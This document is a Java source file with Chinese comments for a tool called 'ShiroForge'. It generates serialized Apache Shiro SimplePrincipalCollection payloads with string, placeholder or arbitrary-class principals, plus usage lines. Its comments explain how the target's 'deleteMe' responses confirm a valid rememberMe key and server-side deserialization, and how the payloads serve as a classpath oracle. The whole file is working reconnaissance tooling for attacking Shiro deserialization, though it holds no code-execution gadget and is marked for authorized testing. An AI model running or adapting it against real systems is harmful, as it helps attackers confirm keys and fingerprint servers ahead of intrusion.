import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * ShiroForge · 通用载荷生成器（不依赖目标的身份类）
 *
 * 三种 spec：
 *   simple        -> principal 为字符串 "marker"
 *                    【通行对照】：目标必然"有"这个类，所以响应里的 deleteMe 消失
 *                    只能证明「密钥正确、服务端确实在解密+反序列化」；
 *                    它无法通过需要读取身份对象的页面（会 500），也进不了后台首页。
 *   mini          -> principal 为本地占位类（目标必然没有）
 *                    【否定对照】：预期响应出现 deleteMe，用于验证判据本身是否可靠。
 *   <base64(类名)> -> principal 为该类的实例（反射创建）
 *                    目标上存在且可实例化时可用于探测类是否存在（classpath oracle）。
 *
 * 用法：
 *   java -cp "build/classes;lib/shiro-core-1.7.1.jar" GenSPCmin <spec> <out.bin>
 *   例：... GenSPCmin simple payload.bin
 *       ... GenSPCmin bWluaQ== payload.bin        # spec 为 base64(类名)
 *
 * 仅限授权测试使用。
 */
public class GenSPCmin {

    public static void main(String[] a) throws Exception {
        if (a.length < 2) {
            System.out.println("用法: java -cp \"build/classes;lib/shiro-core-1.7.1.jar\" "
                    + "GenSPCmin <spec|base64(类名)> <out.bin>");
            System.exit(2);
        }

        String spec = a[0];
        String out = a[a.length - 1];
        Object payload;

        if (spec.equals("simple")) {
            payload = "marker";
        } else if (spec.equals("mini")) {
            payload = new Placeholder();
        } else {
            String fqcn = new String(Base64.getDecoder().decode(spec), "UTF-8");
            payload = instantiate(fqcn);
        }

        SimplePrincipalCollection spc = new SimplePrincipalCollection();
        spc.add(payload, "recon");

        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bo);
        oos.writeObject(spc);
        oos.close();
        Files.write(Paths.get(out), bo.toByteArray());
        System.out.println("spec=" + spec + " principal=" + payload.getClass().getName()
                + " bytes=" + bo.size() + " -> " + out);
    }

    static Object instantiate(String fqcn) throws Exception {
        Class<?> c = Class.forName(fqcn);
        try {
            Constructor<?> ctor = c.getDeclaredConstructor();
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (NoSuchMethodException e) {
            Constructor<?> ctor = c.getDeclaredConstructor(String.class);
            ctor.setAccessible(true);
            return ctor.newInstance("x");
        }
    }

    /** 只存在于生成端 classpath，目标上必然没有（否定对照用） */
    public static class Placeholder implements java.io.Serializable {
        private static final long serialVersionUID = 1L;
    }
}